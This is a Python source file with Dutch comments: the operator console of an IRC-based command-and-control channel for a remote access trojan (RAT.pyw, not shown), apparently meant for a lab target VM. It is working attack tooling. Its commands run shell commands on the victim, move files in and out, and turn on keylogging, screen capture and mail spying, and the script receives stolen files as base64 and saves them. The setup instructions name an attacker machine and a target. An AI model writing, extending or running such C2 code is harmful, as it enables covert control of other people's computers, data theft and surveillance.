"""
C2Server.py — Operator-side IRC console voor het C2-kanaal.

Gebruik:
  1. Start de IRC server:  docker run --name ircd --restart unless-stopped -p 6667:6667 inspircd/inspircd-docker
  2. Vul .secret in met c2_server, c2_port, c2_channel, operator_nick (zie voorbeeld onderaan)
  3. Start dit script op de aanvaller-machine: python C2Server.py
  4. Start RAT.pyw op de doel-VM; die verbindt automatisch en joint hetzelfde kanaal.

Commando's (type ze in de console):
  !shell <cmd>                         — voer een shell-commando uit op het doel
  !download <pad>                      — ontvang een bestand als base64 (sla op met save <naam>)
  !upload <pad> <base64>               — stuur een bestand naar het doel
  !spy <keylog|screen|mail> <on|off>   — schakel een spy-module aan/uit
  !status                              — toon hostname en huidige instellingen
  !help                                — toon commando-overzicht op het doel
  exit / quit                          — sluit de console

Voorbeeld .secret regels (zet dit in het .secret bestand naast RAT.pyw):
  c2_server     = 192.168.x.x
  c2_port       = 6667
  c2_channel    = #c2
  operator_nick = operator
"""

import socket
import threading
import os
import sys
import base64

# ── Configuratie uit .secret ──────────────────────────────────────────────────

def read_secrets(path):
    secrets = {}
    try:
        with open(path, 'r') as f:
            for line in f:
                if '=' in line:
                    key, value = line.strip().split('=', 1)
                    secrets[key.strip()] = value.strip()
    except FileNotFoundError:
        pass
    return secrets

secrets = read_secrets('.secret')

C2_SERVER    = secrets.get('c2_server', '')
C2_PORT      = int(secrets.get('c2_port', '6667'))
C2_CHANNEL   = secrets.get('c2_channel', '#c2')
OPERATOR_NICK = secrets.get('operator_nick', 'operator')

if not C2_SERVER:
    print('[FOUT] c2_server niet gevonden in .secret')
    sys.exit(1)

# ── IRC helpers ───────────────────────────────────────────────────────────────

def send_irc(sock, msg):
    sock.sendall((msg + '\r\n').encode('utf-8'))

# ── Ontvangst-thread: print inkomende IRC berichten ───────────────────────────

last_file_data = {}  # tijdelijk opslaan van ontvangen FILE: berichten

def receiver(sock):
    buf = ''
    while True:
        try:
            data = sock.recv(4096).decode('utf-8', errors='replace')
            if not data:
                print('[VERBINDING VERBROKEN]')
                break
            buf += data
            lines = buf.split('\r\n')
            buf = lines[-1]

            for line in lines[:-1]:
                if line.startswith('PING'):
                    send_irc(sock, 'PONG ' + line.split(' ', 1)[1])
                    continue
                if ' PRIVMSG ' in line:
                    parts = line.split(' ', 3)
                    if len(parts) < 4:
                        continue
                    sender = parts[0].lstrip(':').split('!')[0]
                    msg = parts[3].lstrip(':')

                    # Verberg onze eigen echo's
                    if sender == OPERATOR_NICK:
                        continue

                    # Detecteer bestand-antwoorden (FILE:<naam>:<base64>)
                    if msg.startswith('FILE:'):
                        file_parts = msg.split(':', 2)
                        if len(file_parts) == 3:
                            _, fname, b64data = file_parts
                            last_file_data['name'] = fname
                            last_file_data['data'] = b64data
                            size = len(base64.b64decode(b64data))
                            print(f'\n[BESTAND ONTVANGEN] {fname} ({size} bytes) — typ "save {fname}" om op te slaan')
                        else:
                            print(f'\n[{sender}] {msg}')
                    else:
                        print(f'\n[{sender}] {msg}')

                    print('> ', end='', flush=True)
        except Exception:
            break

# ── Verbinding maken ──────────────────────────────────────────────────────────

print(f'[*] Verbinden met {C2_SERVER}:{C2_PORT} als {OPERATOR_NICK}...')

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((C2_SERVER, C2_PORT))
except OSError as e:
    print(f'[FOUT] Kan niet verbinden: {e}')
    sys.exit(1)

send_irc(sock, f'NICK {OPERATOR_NICK}')
send_irc(sock, f'USER {OPERATOR_NICK} 0 * :{OPERATOR_NICK}')

# Wacht op 001 (welcome) voor we joinen
buf = ''
while True:
    chunk = sock.recv(4096).decode('utf-8', errors='replace')
    buf += chunk
    if ' 001 ' in buf:
        break

send_irc(sock, f'JOIN {C2_CHANNEL}')
print(f'[*] Joined {C2_CHANNEL}')
print('[*] Wacht op bot-verbinding... typ !help voor commando-overzicht\n')

recv_thread = threading.Thread(target=receiver, args=(sock,), daemon=True)
recv_thread.start()

# ── Interactieve console ──────────────────────────────────────────────────────

print('Type een commando (of "exit" om te stoppen):')

while True:
    try:
        cmd = input('> ').strip()
    except (KeyboardInterrupt, EOFError):
        break

    if not cmd:
        continue

    if cmd.lower() in ('exit', 'quit'):
        break

    # Lokaal commando: sla het laatste ontvangen bestand op
    if cmd.lower().startswith('save '):
        filename = cmd[5:].strip() or last_file_data.get('name', 'bestand.bin')
        if 'data' not in last_file_data:
            print('[!] Geen bestand ontvangen om op te slaan')
            continue
        try:
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(last_file_data['data']))
            print(f'[*] Opgeslagen als {filename}')
        except Exception as e:
            print(f'[FOUT] {e}')
        continue

    send_irc(sock, f'PRIVMSG {C2_CHANNEL} :{cmd}')

sock.close()
print('[*] Verbinding gesloten')
